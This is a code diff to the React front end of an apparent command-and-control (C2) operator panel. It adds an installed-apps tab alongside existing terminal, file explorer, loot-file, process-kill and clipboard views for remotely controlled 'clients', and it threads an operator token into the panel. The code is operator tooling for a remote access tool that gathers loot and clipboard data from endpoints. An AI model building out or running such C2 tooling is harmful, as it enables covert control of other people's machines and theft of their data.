@@ -12,6 +12,7 @@ import Endpoints from './components/Endpoints';
 import TerminalView from './components/Terminal';
 import FileExplorer from './components/FileExplorer';
 import ProcessManager from './components/ProcessManager';
+import AppsExplorer from './components/AppsExplorer';
 import ClipboardView from './components/ClipboardView';
 import DatabaseView from './components/DatabaseView';
 import SettingsView from './components/SettingsView';
@@ -21,7 +22,7 @@ import Header from './components/Header';
 import { C2Provider, useC2 } from './context/C2Context';
 import { useC2Polling } from './hooks/useC2Polling';
 import { useFileExplorer } from './hooks/useFileExplorer';
-import type { CommandLog, FileEntry, LootFile, ProcessEntry, PreviewData } from './types';
+import type { CommandLog, FileEntry, InstalledApp, LootFile, ProcessEntry, PreviewData } from './types';
 
 function AppInner() {
   const {
@@ -29,10 +30,14 @@ function AppInner() {
     setC2ConnectionStatus,
     clients, setClients, selectedClientId, setSelectedClientId,
     showToast,
+    c2OperatorToken: operatorTokenForSse,
   } = useC2();
 
-  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
+  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'apps' | 'clipboard' | 'database' | 'settings'>('dashboard');
   const [logs, setLogs] = useState<CommandLog[]>([]);
+  const [appsList, setAppsList] = useState<InstalledApp[]>([]);
+  const [isAppsLoading, setIsAppsLoading] = useState(false);
+  const [appIcons, setAppIcons] = useState<Record<string, string>>({});
   const [previewOpen, setPreviewOpen] = useState(false);
   const [previewData, setPreviewData] = useState<PreviewData | null>(null);
   const [isPreviewLoading, setIsPreviewLoading] = useState(false);
@@ -54,6 +59,10 @@ function AppInner() {
       const next = [...prev, ...lines];
       return next.length > 200 ? next.slice(-200) : next;
     });
+  }, []);
+
+  const mergeAppIcons = useCallback((icons: Record<string, string>) => {
+    setAppIcons(prev => ({ ...prev, ...icons }));
   }, []);
 
   const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
@@ -166,6 +175,7 @@ function AppInner() {
     c2Mode,
     c2ServerUrl,
     authHeader,
+    operatorToken: operatorTokenForSse,
     setClients,
     setLogs,
     setLootFiles,
@@ -174,6 +184,9 @@ function AppInner() {
     setPreviewOpen,
     setPreviewData,
     setIsPreviewLoading,
+    setAppsList,
+    setIsAppsLoading,
+    mergeAppIcons,
     parseFileList,
     appendTermLog,
     setC2ConnectionStatus,
@@ -257,6 +270,9 @@ function AppInner() {
           )}
           {activeTab === 'processes' && (
             <ProcessManager processList={processList} isProcessesLoading={isProcessesLoading} processSearch={processSearch} setProcessSearch={setProcessSearch} fetchProcesses={fetchProcesses} killProcess={killProcess} />
+          )}
+          {activeTab === 'apps' && (
+            <AppsExplorer appsList={appsList} isAppsLoading={isAppsLoading} appIcons={appIcons} executeCommand={executeCommand} />
           )}
           {activeTab === 'clipboard' && (<ClipboardView logs={logs} clients={clients} executeCommand={executeCommand} />)}
           {activeTab === 'database' && <DatabaseView logs={logs} />}
